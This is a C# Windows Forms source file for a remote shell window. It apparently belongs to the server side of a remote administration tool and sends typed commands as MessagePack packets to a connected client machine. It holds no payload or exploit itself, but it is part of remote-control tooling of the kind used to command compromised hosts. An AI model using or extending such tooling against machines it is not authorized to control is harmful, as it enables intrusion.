using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class FormShell : Form
    {
        public Form1 F { get; set; }
        internal Clients Client { get; set; }

        public FormShell()
        {
            InitializeComponent();
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (Client != null)
            if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
            {
                if (textBox1.Text == "cls".ToLower())
                {
                    richTextBox1.Clear();
                    textBox1.Clear();
                }
                if (textBox1.Text == "exit".ToLower())
                {
                    this.Close();
                }
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "shellWriteInput";
                msgpack.ForcePathObject("WriteInput").AsString = textBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                textBox1.Clear();
            }
        }

        private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "shellWriteInput";
            msgpack.ForcePathObject("WriteInput").AsString = "exit";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected) this.Close();
            }
            catch { this.Close(); }
        }
    }
}
